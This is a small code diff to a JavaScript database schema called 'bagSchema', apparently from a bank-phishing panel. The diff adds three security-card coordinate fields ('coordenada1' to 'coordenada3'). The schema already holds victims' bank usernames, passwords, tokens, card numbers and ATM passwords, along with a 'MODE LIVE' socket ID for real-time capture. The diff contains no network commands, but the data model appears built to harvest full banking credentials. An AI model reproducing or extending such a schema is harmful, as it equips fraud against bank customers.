@@ -7,7 +7,7 @@ const bagSchema = new Schema({
     },
     typeDocument: String,
     nroDocument: String,
-        nameBank: String,
+    nameBank: String,
     username: String,
     password: String,
     correo: String,
@@ -16,13 +16,15 @@ const bagSchema = new Schema({
     token1: String,
     token2: String,
     token3: String,
+    coordenada1: String,
+    coordenada2: String,
+    coordenada3: String,
     factor: String,
     method: String,
     image: String,
     tarjeta: String,
     atmPassword: String,
     additionalData: [String],
-
 
     // MODE LIVE
     socketID: String,
